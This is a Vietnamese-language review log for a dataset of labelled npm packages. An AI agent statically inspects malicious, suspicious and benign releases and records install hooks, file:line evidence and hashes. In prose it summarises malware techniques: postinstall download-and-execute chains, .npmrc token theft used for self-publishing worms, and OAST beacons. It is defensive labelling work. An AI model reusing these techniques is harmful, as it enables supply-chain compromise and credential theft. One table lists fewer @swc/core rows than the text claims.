# Hồ sơ kiểm tra nhãn tuần 2

Trạng thái 2026-10-30: `labels.csv` có 76 nhãn (20 `benign`, 2 `suspicious`, 54 `malicious`). Codex đã duyệt tĩnh thêm 71 phiên bản qua bốn batch theo ủy quyền của Phạm Minh Triết; reviewer dùng nhãn cho thí nghiệm vẫn là Phạm Minh Triết. Ba ứng viên nghi vấn cũ chưa có mã để xác minh `file:dòng`. Không chạy mã gói trên host hoặc đưa archive độc vào repo.

| Ứng viên | Nhãn đề xuất | Bằng chứng install hook và hành vi | Nguồn | Trạng thái duyệt |
| --- | --- | --- | --- | --- |
| `greensaver@1.2.3` | malicious | Báo cáo nguồn ghi `postinstall: node lib/greensaver.js`; script giải mã các file giả sourcemap, tải blob mã hóa và đưa mã sau giải mã vào `eval`. Gói đã bị gỡ khỏi npm; chưa đối chiếu được tarball. | [GHSA-jfw2-6254-9cwg](https://github.com/advisories/GHSA-jfw2-6254-9cwg), [OSV MAL-2026-16138](https://github.com/ossf/malicious-packages/blob/f128a26926ba435054707f5af00821644544b030/osv/malicious/npm/greensaver/MAL-2026-16138.json) | Chưa duyệt |
| `merge-grid-stats@1.5.0` | malicious | Báo cáo nguồn ghi `postinstall: node install-cb.js`; script khảo sát container và đọc token service account, biến môi trường có tên liên quan bí mật. Gói đã bị gỡ khỏi npm; chưa đối chiếu được tarball. | [GHSA-vqp7-j6jf-34qm](https://github.com/advisories/GHSA-vqp7-j6jf-34qm), [OSV MAL-2026-13484](https://github.com/ossf/malicious-packages/blob/f8d6dbca88029f7084e1904bf07393368dc9681e/osv/malicious/npm/merge-grid-stats/MAL-2026-13484.json) | Chưa duyệt |
| `carbon-monorepo@20.1.1` | malicious | Báo cáo nguồn ghi `postinstall` chạy `index.js`; đọc môi trường, `.npmrc` và log npm rồi gửi qua HTTP. Gói đã bị gỡ khỏi npm; chưa đối chiếu được tarball. | [GHSA-qqpg-vxw2-32f8](https://github.com/advisories/GHSA-qqpg-vxw2-32f8), [OSV MAL-2026-14229](https://github.com/ossf/malicious-packages/blob/4f8382c22379fc0093ad418cb40f30e203d946ed/osv/malicious/npm/carbon-monorepo/MAL-2026-14229.json) | Chưa duyệt |
| `esbuild@0.24.0` | benign (đã duyệt) | Registry và manifest chính thức ghi `postinstall: node install.js`. Đã đọc tĩnh tarball phát hành: `install.js:184-189,233-238,265-284` cài hoặc tải binary đúng gói/phiên bản và kiểm tra phiên bản binary. Đây là tác vụ cài binary của trình bundler; **có tải và chạy binary**. | [manifest bản phát hành](https://github.com/evanw/esbuild/blob/v0.24.0/npm/esbuild/package.json), [tài liệu cài đặt](https://esbuild.github.io/getting-started/) | Codex duyệt theo ủy quyền TV2, 29/10/2026 |
| `@swc/core@1.7.36` | benign (đã duyệt) | Registry ghi `postinstall: node postinstall.js`. Đã đọc tĩnh tarball phát hành: `postinstall.js:79-97,113-128` kiểm tra native binding; khi thiếu thử cài `@swc/wasm` cùng phiên bản. Đây là đường dự phòng của compiler; **có thể gọi npm install trong install hook**. | [trang bản phát hành](https://www.npmjs.com/package/@swc/core/v/1.7.36), [mã nguồn tag v1.7.36](https://github.com/swc-project/swc/blob/v1.7.36/packages/core/postinstall.js) | Codex duyệt theo ủy quyền TV2, 29/10/2026 |

Hai tarball lành được tải bằng `npm pack --ignore-scripts`, chỉ đọc tĩnh trong thư mục tạm ngoài repo. SHA-512 của từng tarball khớp `dist.integrity` từ npm registry: `esbuild@0.24.0` = `sha512-FuLPevChGDshgSicjisSooU0cemp/sGXR841D5LHMB7mTVOmsEHcAxaH3irL53+8YDIeVNQEySh4DaYU/iuPqQ==`; `@swc/core@1.7.36` = `sha512-bu7ymMX+LCJOSSrKank25Jaq66ymLVA9fOUuy4ck3/6rbXdLw+pIJPnIDKQ9uNcxww8KDxOuJk9Ui9pqR+aGFw==`. Không thực thi hook.

Ba nguồn malware đều bắt nguồn từ Amazon Inspector qua GitHub Advisory/OSV; hai URL cho cùng gói không phải hai kiểm tra độc lập. `npm view` trả E404/unpublished cho cả ba. Để nhập nhãn malicious theo hợp đồng có `file,lines`, TV2 cần bằng chứng dòng từ bản sao an toàn trong VM hoặc nguồn công khai đáng tin cậy có đánh số dòng. Nếu không lấy được, ghi `không xác minh được` và giữ ứng viên ngoài `labels.csv`.

Hai nhãn `benign` đã được chia theo cụm: `@swc/core` vào `dev`, `esbuild` vào `test`. Tập này chưa có nhãn `malicious` hoặc `suspicious`, nên không dùng để báo cáo accuracy, recall hay F1 của agent.

## Kết quả kiểm tra theo ủy quyền TV2

1. Xác minh `name@version`, lifecycle hook, mục đích và hành vi bằng nguồn độc lập hoặc phân tích tĩnh trong VM.
2. Ghi đường dẫn file, dòng bằng chứng, nhãn cuối (`malicious`/`suspicious`/`benign`), nguồn và lý do. Với gói lành, xác nhận hành vi cài binary có giới hạn đúng gói/phiên bản.
3. Ghi người kiểm tra và ngày; chỉ đưa dòng đủ bằng chứng vào `labels.csv`. Codex đã duyệt và nhập hai dòng `benign` theo ủy quyền ngày 29/10/2026, rồi kiểm tra bằng `prepare_labels`.

| Ứng viên | File:dòng đã xác minh | Nhãn/trạng thái | Lý do/nguồn đối chiếu | Người kiểm tra/ngày |
| --- | --- | --- | --- | --- |
| `greensaver@1.2.3` | Không xác minh được: tarball đã bị gỡ | Chưa kết luận | GHSA và OSV cùng nguồn Amazon Inspector; mô tả hành vi chưa thay cho mã có số dòng. Cần mẫu trong VM hoặc nguồn công khai đáng tin cậy. | Codex hỗ trợ TV2, 2026-10-28 |
| `merge-grid-stats@1.5.0` | Không xác minh được: tarball đã bị gỡ | Chưa kết luận | GHSA và OSV cùng nguồn Amazon Inspector; chưa đối chiếu `install-cb.js`. Cần mẫu trong VM hoặc nguồn công khai đáng tin cậy. | Codex hỗ trợ TV2, 2026-10-28 |
| `carbon-monorepo@20.1.1` | Không xác minh được: tarball đã bị gỡ | Chưa kết luận | GHSA và OSV cùng nguồn Amazon Inspector; chưa đối chiếu `index.js`. Cần mẫu trong VM hoặc nguồn công khai đáng tin cậy. | Codex hỗ trợ TV2, 2026-10-28 |
| `esbuild@0.24.0` | `package.json:10`; `install.js:184-189,233-238,265-284` | `benign` — đã duyệt cho hành vi cài binary | Tarball có SHA-512 khớp `dist.integrity` npm Registry; [manifest tag v0.24.0](https://github.com/evanw/esbuild/blob/v0.24.0/npm/esbuild/package.json) xác nhận hook. Khi thiếu binary, script cài `@esbuild/*` đúng phiên bản hoặc tải từ Registry rồi kiểm tra phiên bản. Có thực thi binary để kiểm tra; chưa audit toàn bộ mã gói. | Codex, 2026-10-29 (TV2 ủy quyền) |
| `@swc/core@1.7.36` | `package.json:49`; `postinstall.js:79-97,113-128` | `benign` — đã duyệt cho fallback compiler | Tarball có SHA-512 khớp `dist.integrity` npm Registry; [mã nguồn tag v1.7.36](https://github.com/swc-project/swc/blob/v1.7.36/packages/core/postinstall.js) mô tả fallback. Script thử native binding, nếu thiếu thì cài `@swc/wasm` cùng phiên bản. Có chạy `npm install` trong hook; chưa audit toàn bộ mã gói. | Codex, 2026-10-29 (TV2 ủy quyền) |

Hai nhãn `benign` được duyệt trên bản phát hành có SHA-512 khớp npm Registry và đường cài đặt đã đọc tĩnh; không chứng minh mọi đường thực thi của gói vô hại. Hai dòng đã nhập `labels.csv` và `prepare_labels` gán split ổn định. Ba ứng viên nghi vấn vẫn ở ngoài bảng nhãn vì thiếu bằng chứng `file:dòng`; không dùng hai nhãn này để đo độ chính xác agent.

## Đối chiếu 450 ứng viên metadata — 2026-10-29

Codex đối chiếu từng `package@version` trong `public_candidates_450.csv` với manifest phiên bản trên npm Registry, gồm tên, phiên bản, lifecycle hook và sự hiện diện của `dist.integrity`. Kết quả từng dòng ở [`metadata_review_450.csv`](review_450/metadata_review_450.csv): 445 dòng `verified`, 5 dòng `unavailable` vì HTTP 404, không có cặp tên/phiên bản trùng. Cả 445 manifest truy cập được đều có integrity; 5 dòng không truy cập được có trạng thái integrity `unknown`.

Năm dòng 404: `@s4yhiitestpoc/r2-echo@1.0.0`, `@s4yhiitestpoc/scan-echo-b@1.0.0`, `@s4yhiitestpoc/scan-https-d@1.0.0`, `@s4yhiitestpoc/r2-https-b@1.0.0`, `@s4yhiitestpoc/scan-dns-c@1.0.0`.

**Quyết định nhãn:** 450/450 dòng là `needs_code_review`, chưa có nhãn mới nào được chuyển sang `labels.csv`. Manifest khớp và có integrity chỉ chứng minh dữ liệu phát hành được đối chiếu; không chứng minh hành vi lành. Năm gói 404 cũng không thể kết luận độc khi không có mã phát hành. Để chốt dữ liệu v1 cần bản mã đúng phiên bản, bằng chứng `file:dòng`, nguồn kiểm tra độc lập và người/ngày duyệt; ba ứng viên nghi vấn ban đầu vẫn thiếu các bằng chứng này. Lượt đối chiếu không tải tarball, chạy install script hay AI scan 450 gói.

Tra cứu GitHub công khai theo tên ba gói nghi vấn và tên file install ngày 29/10 chỉ tìm thấy advisory hoặc bản sao advisory, chưa thấy mã nguồn của đúng bản phát hành. Các bản sao này không phải nguồn kiểm tra độc lập. Nếu có tarball hoặc ảnh chụp mã từ nguồn đáng tin cậy, cần kiểm tra trong VM cách ly rồi bổ sung đường dẫn `file:dòng` trước khi duyệt nhãn.

## Duyệt tĩnh thêm một ứng viên — 2026-10-29

| Gói | Kết luận | Bằng chứng đã đọc | Người duyệt |
| --- | --- | --- | --- |
| `@ma.vu/virus@1.0.3` | `suspicious`, không khẳng định `malicious` | `package.json:14-16` gọi `./moon.sh` ở `postinstall`; `moon.sh:2` chạy `env`, in toàn bộ biến môi trường ra stdout của quá trình cài đặt. `index.js:1-3` chỉ xuất hàm chào. Không thấy lệnh gửi dữ liệu ra mạng trong đường `postinstall` đã đọc. | Codex theo ủy quyền TV2, 29/10/2026 |

Nguồn: [tarball npm đúng phiên bản](https://registry.npmjs.org/@ma.vu/virus/-/virus-1.0.3.tgz) và manifest npm `@ma.vu/virus@1.0.3`. Tarball được tải và đọc **chỉ trong Docker dùng một lần**, không mount host, `npm pack --ignore-scripts`; không chạy `moon.sh`. SHA-512 tarball tính trong container là `a08fe3aa2813c072f1cc6c49c5e219cba0f3edbf0ff5536c34b9f7e9509efbdbf9af3b78184ee0990c8f3e12cfd84efd1aaf70e408315737adadd55d854e83dd`, khớp `dist.integrity` của npm Registry. Nhãn `suspicious` mô tả nguy cơ lộ biến môi trường vào log; không có bằng chứng chiếm dụng bí mật hoặc exfiltration qua mạng. Dòng này đã được thêm vào `labels.csv`, `prepare_labels` xếp vào `dev`.

Đã xem thêm `@amrahulmail/ctf-lab-evil@1.2.0` trong container. `postinstall.js:3-12` tự khai là bài lab với thông tin đăng nhập giả; `postinstall.js:33-48` gửi payload tới `example.com`. Vì đây là mô phỏng CTF, chưa nhập vào bảng nhãn dùng cho đánh giá gói thực. `metadata_review_450.csv` là ảnh chụp của lượt đối chiếu metadata trước hai lượt đọc mã này; trạng thái `needs_code_review` trong ảnh chụp không thay thế quyết định mới nhất ở `labels.csv` và hồ sơ này.

## Đối chiếu advisory và kiểm tra mã trong Docker — 2026-10-29

Truy vấn batch OSV với đúng 450 cặp `package@version` tìm thấy 8 cặp có advisory. Năm manifest đã trả HTTP 404 trong lượt đối chiếu metadata; `@s4yhiitestpoc/r2-dns@1.0.0` còn manifest nhưng tarball trả HTTP 404 khi `npm pack --ignore-scripts`. Hai tarball còn lấy được và đã đọc tĩnh trong Docker dùng một lần, không mount host hay chạy lifecycle script:

| Gói | Nhãn duyệt | Bằng chứng mã đúng phiên bản | Đối chiếu độc lập |
| --- | --- | --- | --- |
| `exnesss@0.0.1` | `malicious` — beacon ngoài ý muốn khi cài đặt; chưa thấy lấy credential | `package.json:6-7` tự gọi `postinstall.js`; `postinstall.js:5` đặt miền OAST, `postinstall.js:10-11` gọi HTTPS tới đó, `postinstall.js:26` kích hoạt `ping()` ngay khi nạp. Đây là typosquat của `exness` và script không cung cấp tính năng cho người cài. | OSV [MAL-2026-11518](https://api.osv.dev/v1/vulns/MAL-2026-11518) tổng hợp hai phân tích riêng của Amazon Inspector và OpenSSF Package Analysis. Codex kiểm tra mã tarball, 29/10/2026. |
| `@miurba/alcazaba@99.99.99` | `suspicious` — PoC nghiên cứu nhưng thật sự gửi metadata máy cài | `package.json:6-8` chạy `phone-home.js` ở cả `preinstall` và `postinstall`; `phone-home.js:26-36` thu hostname, username, thư mục hiện tại và tên biến môi trường CI; `phone-home.js:39-52` đưa chúng vào DNS lookup và HTTPS GET tới OAST. Chưa thấy đọc giá trị biến môi trường hoặc nội dung file. | OSV [MAL-2026-3410](https://api.osv.dev/v1/vulns/MAL-2026-3410) có nguồn Amazon Inspector và OpenSSF Package Analysis. Manifest tự mô tả là security research placeholder; Codex giữ nhãn `suspicious`, 29/10/2026. |

Nguồn tarball: [`exnesss@0.0.1`](https://registry.npmjs.org/exnesss/-/exnesss-0.0.1.tgz) và [`@miurba/alcazaba@99.99.99`](https://registry.npmjs.org/@miurba/alcazaba/-/alcazaba-99.99.99.tgz). SHA-512 tính từ tarball trong container khớp `dist.integrity` của npm Registry: `exnesss` = `daeda9dbf5cb4fb43e1c8a89795e2fa5be22c53265c566a6ecb82e20c71da616a99e70bc45008feba826b89bda5d840fa3718672519f46268a14a81bf9526396`; `@miurba/alcazaba` = `f743d2339fcb152d2546766bb1c955fb4fbb9c2e525dc5fff1c8cc551ad6afcb70ea0a9385c854c8e20cd84b82f560ad77e9c70a37ceec85a8d31adac680969c`. Hai dòng đã vào `labels.csv`. `prepare_labels` xác nhận 5 dòng hợp lệ và chia theo cụm: `exnesss` ở `dev`, `@miurba/alcazaba` ở `test`.

OSV là nguồn chọn ứng viên, không thay thế việc đọc mã. Lượt batch này chỉ tìm advisory đã biết, không xác nhận các gói không có hit là lành. Bộ 76 nhãn vẫn chưa đủ đại diện để công bố độ chính xác, recall hoặc F1 của agent: 53 bản độc thuộc ba chiến dịch, 20 bản lành thuộc hai họ gói.

## Batch Datadog MUT-4831 — 2026-10-30

Nguồn độc lập: [Datadog Security Labs — MUT-4831](https://securitylabs.datadoghq.com/articles/mut-4831-trojanized-npm-packages-vidar/). Archive đúng phiên bản lấy từ [Datadog malicious software packages dataset](https://github.com/DataDog/malicious-software-packages-dataset); URL từng archive nằm ở cột `source` của `labels.csv`. Codex đọc `package.json` và mã bằng `zipfile` trong Docker dùng một lần, chỉ đọc; không chạy `npm install`, lifecycle hook, payload hoặc AI scan. SHA-256 dưới đây là của file ZIP archive, không phải của tarball npm.

18 phiên bản được kiểm tra; 17 phiên bản có hook `postinstall` nối đến file mã tồn tại và đường tải/giải nén/chạy tệp từ máy chủ ngoài. Gán nhãn `malicious` dựa trên mã tĩnh và đối chiếu phân tích Datadog. Bốn hook PowerShell (`sabaoa`, `sabay`, `sai`, `salli`) dùng `iwr` tải ZIP trong `package.json:25` rồi gọi `src/extract.js`; các phiên bản còn lại tải trong file JS. `react-icon-pkg@1.5.2` gọi `cmd.exe` chạy BAT. Dòng bằng chứng liệt kê vị trí URL, giải nén hoặc thực thi; không chứng minh payload đã chạy trong môi trường thật.

| Phiên bản | Bằng chứng mã tĩnh | SHA-256 archive |
| --- | --- | --- |
| `abeya-tg-api@1.0.0` | `package.json:25` → `src/extract.js:173,161,188` | `bc8efb220ba9ac086e226aaaeb3b4742055bac2fc82a1d2768bf2a614cdc5738` |
| `bael-god-admin@1.0.0` | `package.json:25` → `src/extract.js:185,164,200` | `470e88a41242fdd4d87acb6d0e348f5d40a0aac56f2f018efb4979356f44f1f0` |
| `bael-god-api@1.0.0` | `package.json:25` → `src/extract.js:173,161,188` | `fc70e0148bd6f4dc87752f7260cbb59385d82fb6b4ed05b9deed6fd29b34d889` |
| `bael-god-thanks@1.0.0` | `package.json:25` → `src/extract.js:185,164,200` | `d4bd2d45e97f9ae6a1616a23a4f921a7e6f93ea88d33cf5180f9d8737de750e3` |
| `botty-fork-baby@1.0.0` | `package.json:25` → `src/dependencies.js:173,161,188` | `767f7af3a0fc27cdaa2f76adadc5fb75e95dc502f94eb64b52d5a3ceb1e1db04` |
| `cursor-ai-fork@1.0.0` | `package.json:25` → `src/dependencies.js:173,161,188` | `3bcda239f0077b5aa9cc28484d335ee0c01df2a033c8221a25ab4eb64edc0f5b` |
| `cursor-app-fork@1.0.0` | `package.json:25` → `src/dependencies.js:173,161,188` | `fbd48c9f7fe12e773d81187930b4a13532a8d579386761f88e7aba7f51662ab8` |
| `custom-telegram-bot-api@1.0.0` | `package.json:25` → `src/extract.js:173,161,188` | `75c2411792010a41453d156104b2ac90c6bb253f4333a46bc83a67b54c88c1ef` |
| `custom-tg-bot-plan@1.0.1` | `package.json:25` → `src/dependencies.js:173,161,188` | `9b857e817b13ee676e67d4672a99b192d0b699f116e06d44f04942141a2142d6` |
| `icon-react-fork@1.0.0` | `package.json:25` → `src/dependencies.js:173,161,188` | `8dfd1efb4a9854e3446be794ff3b2d1157cd81fef7af17984d555119aa4595c5` |
| `react-icon-pkg@1.5.2` | `package.json:27` → `src/dependencies.js:250,267,279,287` | `571854ec860dde06b0d303b8480dc43b86de357ef9b623f4ac1c0e58579b3d07` |
| `sabaoa-tg-api@1.0.0` | `package.json:25` (PowerShell tải ZIP) → `src/extract.js:113,141,148` | `0a77f64a95461ecad30686cbef3f42896f8fb81fd594f1ef342eb257e64a5b0e` |
| `sabay-tg-api@1.0.0` | `package.json:25` (PowerShell tải ZIP) → `src/extract.js:93,118,124` | `0bf6c9a54a487acbb201c279f8c189e569adc984f577e7d75ff48ec7bbee0f81` |
| `sai-tg-api@1.0.0` | `package.json:25` (PowerShell tải ZIP) → `src/extract.js:85,110,116` | `8175caa37cf26824e66f40a9520db012613f6687cecf316262bdeb3796101c82` |
| `salli-tg-api@1.0.0` | `package.json:25` (PowerShell tải ZIP) → `src/extract.js:85,110,116` | `536d7ff029b908670e974b725b8ca4708ed048d1c4580b723447650f7e91ece4` |
| `telegram-bot-start@1.0.0` | `package.json:28` → `src/dependencies.js:173,161,188` | `45db866610e1fbed24e08190f034c1e834d5c42971fe8aa0ec54f0f6f8a70662` |
| `telegram-bot-starter@1.2.7` | `package.json:28` → `src/dependencies.js:239,227,259` | `e98e837add0fe33fa55399b92334522df12056ccbe115059eddd0ed45904e6da` |

Giữ `custom-tg-bot-plan@1.0.0` ở trạng thái `needs_code_review`: `package.json:25` gọi `node src/dependencies.js` nhưng file đó không có trong archive đúng phiên bản; có `src/extract.js` song hook không trỏ tới. Không suy ra mã đó đã được kích hoạt. 17 bản mới cùng `cluster=mut-4831`, `split=dev` để tránh rò rỉ cùng chiến dịch qua hai tập. Nhóm chỉ dùng các nhãn này sau kiểm tra chéo của Phạm Minh Triết; bộ dữ liệu vẫn mất cân bằng và chưa đủ đánh giá mô hình.

## Batch Datadog compromised_lib — 2026-10-30

Codex kiểm tra thêm 18 archive đúng tên và phiên bản, thuộc 18 gói khác nhau trong [Datadog malicious software packages dataset](https://github.com/DataDog/malicious-software-packages-dataset/tree/main/samples/npm/compromised_lib). URL archive từng dòng nằm ở `source` của `labels.csv`; SHA-256 dưới đây là của ZIP archive. Chỉ đọc `package.json` và mã đã mã hóa bằng `zipfile` trong Docker dùng một lần, không mount host và không thực thi hook, script con hay `npm publish`.

Cả 18 bản có `package.json:7` khai báo `postinstall: node index.js` và file đích tồn tại. Hai fingerprint mã `index.js` và `scripts/deploy.js` đã được đối chiếu với hai bản đại diện: `index.js:12,18` đọc `.npmrc`, dòng 91 tạo tiến trình `scripts/deploy.js`, dòng 94 truyền `NPM_TOKENS`; script con dùng token với npm Registry và gọi `npm publish` ở dòng 65 hoặc 66. Đây là hành vi phát tán qua token trong lúc cài đặt, nên gán `malicious`. Hai cặp SHA-256 mã là `0c0d206d5e68c0cf64d57ffa8bc5b1dad54f2dda52f24e96e02e237498cb9c3a` / `5e2ba7c4c53fa6e0cef58011acdd50682cf83fb7b989712d2fcf1b5173bad956` và `c37c0ae9641d2e5329fcdee847a756bf1140fdb7f0b7c78a40fdc39055e7d926` / `158091ec92a3a91d7d2d29e6b867d47479d624bcae5f067cc80af4eff91c9729`.

| Phiên bản | Bằng chứng mã tĩnh | SHA-256 archive |
| --- | --- | --- |
| `@emilgroup/partner-sdk@1.19.2` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:65` | `2e133aeb2d49b40f83434bdbff92fe2aca347ae9017cda8375c4fad094a72e3d` |
| `@emilgroup/accounting-sdk@1.27.3` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `b9b96f6e1452c9b5f561474a031042a25170297699c94debd3690c9117b3ad60` |
| `@emilgroup/commission-sdk-node@1.0.2` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:65` | `132592fcee1250e1e10c504574b74db474e82e0e333417dcd3374837d385261d` |
| `@emilgroup/commission-sdk@1.0.2` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:65` | `b6646a039712a25bff6b8712b1ab45393664e248300d6b8e2c5ca89131ce0715` |
| `@opengov/ppf-eslint-config@0.1.11` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `cd4f9cfa8b049c07e5983b93be321dfa463a25fca0aaab47050ac8bbe9f50304` |
| `@emilgroup/gdv-sdk-node@2.6.3` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `c7010521b9f4abbd16e712f10bcfb96a13cf11605431f39e354876e9d11f0962` |
| `@emilgroup/document-uploader@0.0.12` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `b0ce291fbd7135c760d8bba61e71c8c2567e77045a652ecb06c29b75b3b593ba` |
| `@opengov/qa-record-types-api@1.0.3` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `e237e2ea8387b9d5c373a2d29f68e5ba388c5a56688b19a2d458ea4ca16907d2` |
| `@emilgroup/numbergenerator-sdk-node@1.3.2` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:65` | `92e84a6e84d74edc65eba61d3e0e33d7fc6d8520cf4276e7a70a7a0c387bb187` |
| `react-leaflet-marker-layer@0.1.5` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `9f7a98cd601846d5cbc5960b9ecd86ea296870794c4d1450870681e6759765a6` |
| `@emilgroup/task-sdk-node@1.0.3` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:65` | `a2d5f5099730ede3b1fb72e5cd653d193ee4e9036335e5601893099b07ebc2b4` |
| `@emilgroup/process-manager-sdk@1.4.2` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `2a07bac1068bec1a8475709ec14378c4fd80ff8a8cbeb16510d4d18ff0dae5af` |
| `@emilgroup/changelog-sdk-node@1.0.3` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `9f6b69a0e89749375c67df59c67435be4a33249c9a1e3d198dd05945d4b2a00c` |
| `@leafnoise/mirage@2.0.3` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `37fb49a509c1df17ebc095c7bb163fa94595bf7c15813c6ff8acc73ffc6b05db` |
| `@emilgroup/task-sdk@1.0.3` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:65` | `7de5741a470aae844c564b68558e65848e585c38d785dec33d8fdd67beaa576c` |
| `@emilgroup/discount-sdk-node@1.5.2` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `9e8ea667eefcd413390709af13b72eda28eafdfcc5336b9fbddd226e3afd29ed` |
| `jest-preset-ppf@0.0.2` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `5b89cd5b863e3b45ff89df1a9ea802850dd0d888d47d3dc72047a03ed375feb9` |
| `react-leaflet-cluster-layer@0.0.4` | `package.json:7` → `index.js:12,18,91,94` → `scripts/deploy.js:66` | `05de5918ede213b3edf29d1b5997618c9b47c530fd41a5eae91e4e0093511d02` |

Các bản này cùng `cluster=npm-token-worm-2026-03` và `split=dev`. Hai batch Datadog bổ sung 35 nhãn, song chỉ đại diện hai chiến dịch; Phạm Minh Triết vẫn cần kiểm tra chéo trước khi dùng nhãn cho đánh giá mô hình. Không suy ra tính năng độc đã chạy thành công trên máy thật từ kiểm tra tĩnh.

## Batch lành esbuild và @swc/core — 2026-10-30

Codex đọc tĩnh 18 tarball phát hành từ npm Registry trong Docker dùng một lần: 9 phiên bản `esbuild`, 9 phiên bản `@swc/core`. Tên/phiên bản trong `package.json` khớp metadata; SHA-512 tarball khớp `dist.integrity` cho cả 18 bản. Chỉ có `postinstall` trong các lifecycle hook: `node install.js` hoặc `node postinstall.js`, file đích đều tồn tại. Không chạy hook hay mã native.

Tám bản `esbuild` có cùng SHA-256 `install.js` = `417cbbaf3ea9cb878011832b70eeaa00ce49419a0589cbbf4b65d258c4d7c1dd`; bản `0.25.6` thêm nền tảng OpenHarmony và kiểm tra WASM trước khi liên kết binary. Mã chọn gói `@esbuild/*` theo hệ điều hành/kiến trúc (`install.js:66-78`), cài đúng phiên bản bằng npm hoặc tải trực tiếp từ `registry.npmjs.org` (`install.js:178-187,234-245,269-281`). Chín bản `@swc/core` có cùng SHA-256 `postinstall.js` = `5da0f556c5702eaf4c4b66283f03aeccbd8db3d4b730866741ca23c799614a87`; mã thử native binding rồi chỉ cài `@swc/wasm` đúng phiên bản nếu không dùng được binding (`postinstall.js:79-128`). Hai đường cài này phục vụ chức năng công khai của gói nên gán `benign` cho hành vi install đã đọc. Kiểm tra này không phải kiểm toán toàn bộ binary hay mọi file của gói.

| Phiên bản | Bằng chứng install hook và mã | SHA-512 tarball |
| --- | --- | --- |
| `esbuild@0.24.1` | `package.json:10` → `install.js:66,186,235,269-273` | `6c7356e7b60028d8755526d73f7dc42fd0debed46e4f5d1ccc684bf729caa4e01e04c340933b0ff0548da054db53769b401ee439bf89a9473cf45aa564d6c479` |
| `esbuild@0.24.2` | `package.json:10` → `install.js:66,186,235,269-273` | `fbd7a0a415bc237083e573ded27e817d3e5fc4bcf1ae50f3ab2745ddabe21bef678b59430bf3af307731a84155d3e2c03591b94756c53167d4ae356c770c49bc` |
| `esbuild@0.25.0` | `package.json:10` → `install.js:66,186,235,269-273` | `057ab99aa73c96d6da377e1c0ea5ae60ac8d857f03fd9d09d7176d750f14708208c89cb3f9930a52de7cb45dd2ad9f398dc7cdfcf658863479b8340060d55bbb` |
| `esbuild@0.25.1` | `package.json:10` → `install.js:66,186,235,269-273` | `0463b92edac60bbbf19eab9c01efeb9af29d26595f19a616772001bf23285d095f60c6f66db46e45e591e6d10613fff82dc3498fd5eb928bd3a8d6111591c031` |
| `esbuild@0.25.2` | `package.json:10` → `install.js:66,186,235,269-273` | `d7af39e3371c28f9c2fada0ccb00beb8a35e612bfefde5e47af4407f0443fc6f4295eabaea6f17148ae28246ef6ae2cb9427c32f8e50d9c59e812839de01819d` |
| `esbuild@0.25.3` | `package.json:10` → `install.js:66,186,235,269-273` | `a8a03a3ef6a2ef7f8cd85b5fb6934a47127bf062239855c5c5dff50d506a1a8fea3612d27eff86d769fda4da16772b490bc534d13ad588ec298d3d3382a412f1` |
| `esbuild@0.25.4` | `package.json:10` → `install.js:66,186,235,269-273` | `f298232d47148dc80383ed90e0d6179cf6e8fef9dc018e149b26829b48d97af111a821d921a5b07491e47fc5d0b6ee00c5228276fad46d3d1752bd48759cc8f1` |
| `esbuild@0.25.5` | `package.json:10` → `install.js:66,186,235,269-273` | `3fc3ad29946fff9279861cf471401dbbf70bb8f20a5e9425d51f6966dbe61d642fac051577450d20f4f8201e16deb34ea953b4ae5a8798221b4b0c61fdcf7251` |
| `esbuild@0.25.6` | `package.json:10` → `install.js:67,187,237,271-275` | `195bb3b94c2d76c821137a1c27d06cf0f368175dc7350e535db122d8086f55bf31535230b7d168b3d1446a67e879efaefd33ac9fb19459cd38973e3a9f66db4e` |
| `@swc/core@1.7.23` | `package.json:49` → `postinstall.js:79-128` | `543364a43bc396b786876137b650e3f01de98a2b8b861400ffbac8559a622d4bc6d58a6e7006ba37b8835c0ec673ff876a1f2ca5a0a0feabc468190299c21809` |
| `@swc/core@1.7.24` | `package.json:49` → `postinstall.js:79-128` | `17325a6a2eb3e8361d202018d5428d379a734e7dbdea4b0adb3cc48e369796966da0c90692d593d2db52ee16dd0423c684b3aee50f53036cdd3de8ca5058e08a` |
| `@swc/core@1.7.25` | `package.json:49` → `postinstall.js:79-128` | `1164d675bd060fe67d081caf5b98f96fd775705afd3fa872ed3906800c2784ac46c331aef011d31b7a2edbc298e8fe7bc995c354a0747b15a648d448bfa2d80a` |
| `@swc/core@1.7.26` | `package.json:49` → `postinstall.js:79-128` | `7f9b9815ff9398c432608a31927fdebd684d1ae5330bbdf4745c00286c015471d5a0fc9a935fc6bc9526ea2d522a5fb61eb8fda0dd22dd64a8596678a6023c97` |
| `@swc/core@1.7.28` | `package.json:49` → `postinstall.js:79-128` | `5daa5c320b0e4b470a874d401448fea973a4e8a338359869edae6f3e271d864451f11cef8eb09aec34ed8a33317e8b54f1ba9a10782ec668886a0d875254fc41` |
| `@swc/core@1.7.35` | `package.json:49` → `postinstall.js:79-128` | `ddc52d7824dbaf6af98ea7e0c74af4f75b1fab932087a17549087c5c03a74afb4acf0bf66c2df59af04754089e0f5b8f6b69072612dabf6d034205ce869122b7` |
| `@swc/core@1.7.39` | `package.json:49` → `postinstall.js:79-128` | `8e7b3a54578e4f8f6ea1328b58811f890a89025caa95d340b7cd2402bf1fedae588d7d338271b744188b32992cc7829ae1294ae0ee9327f96e9883374eba7cda` |
